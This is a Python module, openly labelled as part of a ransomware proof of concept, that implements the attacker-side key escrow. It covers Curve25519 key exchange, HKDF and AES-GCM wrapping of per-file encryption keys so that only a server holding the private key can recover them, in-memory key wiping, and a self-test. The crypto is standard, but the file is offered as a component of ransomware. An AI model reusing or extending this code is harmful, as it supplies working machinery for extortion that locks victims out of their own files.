#!/usr/bin/env python3
"""
Curve25519 key exchange module for ransomware PoC.
Modern alternative to RSA for key exchange.
"""

import os
from typing import Optional, Tuple

from cryptography.hazmat.primitives.asymmetric.x25519 import (
    X25519PrivateKey,
    X25519PublicKey,
)
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend


class Curve25519KeyExchange:
    """
    Curve25519 key exchange for secure key transmission.
    Provides smaller keys and better performance than RSA.
    """

    def __init__(self):
        self._private_key: Optional[X25519PrivateKey] = None
        self._public_key: Optional[X25519PublicKey] = None

    def generate_keypair(self) -> Tuple[bytes, bytes]:
        """
        Generate Curve25519 key pair.
        Returns (private_key_bytes, public_key_bytes) in raw format.
        """
        self._private_key = X25519PrivateKey.generate()
        self._public_key = self._private_key.public_key()

        private_bytes = self._private_key.private_bytes(
            encoding=serialization.Encoding.Raw,
            format=serialization.PrivateFormat.Raw,
            encryption_algorithm=serialization.NoEncryption()
        )

        public_bytes = self._public_key.public_bytes(
            encoding=serialization.Encoding.Raw,
            format=serialization.PublicFormat.Raw
        )

        return private_bytes, public_bytes

    def load_private_key(self, private_bytes: bytes):
        """Load private key from raw bytes."""
        self._private_key = X25519PrivateKey.from_private_bytes(private_bytes)
        self._public_key = self._private_key.public_key()

    def load_public_key(self, public_bytes: bytes):
        """Load public key from raw bytes."""
        self._public_key = X25519PublicKey.from_public_bytes(public_bytes)

    def derive_shared_secret(self, peer_public_bytes: bytes) -> bytes:
        """
        Derive shared secret using ECDH.
        Returns 32-byte shared secret.
        """
        if self._private_key is None:
            raise ValueError("Private key not loaded")

        peer_public = X25519PublicKey.from_public_bytes(peer_public_bytes)
        shared_key = self._private_key.exchange(peer_public)

        return shared_key

    def encrypt_with_shared_secret(self,
                                   peer_public_bytes: bytes,
                                   plaintext: bytes) -> Tuple[bytes, bytes]:
        """
        Encrypt data using derived shared secret.
        Returns (nonce, ciphertext).
        """
        shared_secret = self.derive_shared_secret(peer_public_bytes)

        # Use AES-256-GCM with shared secret
        # Derive 256-bit key from shared secret
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF

        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'ransomware-key-derivation'
        ).derive(shared_secret)

        nonce = os.urandom(12)
        aesgcm = AESGCM(derived_key)
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)

        return nonce, ciphertext

    def decrypt_with_shared_secret(self,
                                   peer_public_bytes: bytes,
                                   nonce: bytes,
                                   ciphertext: bytes) -> bytes:
        """
        Decrypt data using derived shared secret.
        """
        shared_secret = self.derive_shared_secret(peer_public_bytes)

        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.hkdf import HKDF

        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'ransomware-key-derivation'
        ).derive(shared_secret)

        aesgcm = AESGCM(derived_key)
        return aesgcm.decrypt(nonce, ciphertext, None)


class HybridEncryption:
    """
    Hybrid encryption combining Curve25519 + ChaCha20.
    For ransomware: Server uses Curve25519, encrypts ChaCha key.
    """

    def __init__(self):
        self.curve = Curve25519KeyExchange()

    def generate_server_keypair(self) -> Tuple[bytes, bytes]:
        """
        Server generates keypair.
        Returns (private, public).
        """
        return self.curve.generate_keypair()

    def client_encrypt_key(self,
                          server_public: bytes,
                          chacha_key: bytes) -> Tuple[bytes, bytes, bytes]:
        """
        Client encrypts ChaCha key for server.
        Returns (client_public, nonce, encrypted_key).
        """
        # Client generates ephemeral keypair
        client_curve = Curve25519KeyExchange()
        client_private, client_public = client_curve.generate_keypair()

        # Encrypt key using shared secret
        nonce, encrypted = client_curve.encrypt_with_shared_secret(
            server_public, chacha_key
        )

        return client_public, nonce, encrypted

    def server_decrypt_key(self,
                          server_private: bytes,
                          client_public: bytes,
                          nonce: bytes,
                          encrypted_key: bytes) -> bytes:
        """
        Server decrypts ChaCha key.
        Returns decrypted ChaCha key.
        """
        self.curve.load_private_key(server_private)

        return self.curve.decrypt_with_shared_secret(
            client_public, nonce, encrypted_key
        )


class KeyManager:
    """
    Manages encryption keys securely in memory.
    """

    def __init__(self):
        self._keys: dict = {}

    def generate_and_store(self, file_id: str) -> bytes:
        """Generate key and store in memory only."""
        key = os.urandom(32)  # 256-bit key
        self._keys[file_id] = key
        return key

    def get_key(self, file_id: str) -> Optional[bytes]:
        """Retrieve key from memory."""
        return self._keys.get(file_id)

    def delete_key(self, file_id: str):
        """Delete key from memory."""
        if file_id in self._keys:
            # Overwrite with zeros
            self._keys[file_id] = bytes(len(self._keys[file_id]))
            del self._keys[file_id]

    def clear_all(self):
        """Wipe all keys from memory."""
        for file_id in list(self._keys.keys()):
            self.delete_key(file_id)


# Convenience functions
def generate_curve25519_keypair() -> Tuple[bytes, bytes]:
    """Generate Curve25519 key pair."""
    curve = Curve25519KeyExchange()
    return curve.generate_keypair()


def hybrid_encrypt(server_public: bytes, plaintext: bytes) -> Tuple[bytes, bytes, bytes]:
    """
    Encrypt data using hybrid encryption.
    Returns (client_public, nonce, ciphertext).
    """
    hybrid = HybridEncryption()
    return hybrid.client_encrypt_key(server_public, plaintext)


def hybrid_decrypt(server_private: bytes,
                  client_public: bytes,
                  nonce: bytes,
                  ciphertext: bytes) -> bytes:
    """Decrypt hybrid-encrypted data."""
    hybrid = HybridEncryption()
    hybrid.curve.load_private_key(server_private)
    return hybrid.curve.decrypt_with_shared_secret(
        client_public, nonce, ciphertext
    )


if __name__ == "__main__":
    print("Curve25519 Key Exchange Test")
    print("=" * 60)

    # Server generates keypair
    print("\n[*] Server generating keypair...")
    hybrid = HybridEncryption()
    server_private, server_public = hybrid.generate_server_keypair()
    print(f"[*] Server public key: {server_public.hex()[:32]}...")
    print(f"[*] Key sizes: private={len(server_private)} bytes, public={len(server_public)} bytes")

    # Client encrypts a ChaCha key
    print("\n[*] Client encrypting ChaCha key...")
    chacha_key = os.urandom(32)
    print(f"[*] ChaCha key: {chacha_key.hex()[:32]}...")

    client_public, nonce, encrypted = hybrid.client_encrypt_key(
        server_public, chacha_key
    )
    print(f"[*] Client public: {client_public.hex()[:32]}...")
    print(f"[*] Encrypted key length: {len(encrypted)} bytes")

    # Server decrypts
    print("\n[*] Server decrypting...")
    decrypted = hybrid.server_decrypt_key(
        server_private, client_public, nonce, encrypted
    )
    print(f"[*] Decrypted key: {decrypted.hex()[:32]}...")

    if decrypted == chacha_key:
        print("[+] Success! Keys match.")
    else:
        print("[!] Failed! Keys don't match.")

    # Compare with RSA
    print("\n[*] Comparison with RSA:")
    print(f"    Curve25519 public key:  {len(server_public)} bytes")
    print(f"    RSA-2048 public key:   ~270 bytes")
    print(f"    Curve25519 is ~{270//len(server_public)}x smaller!")

    print("\n[*] Test complete!")
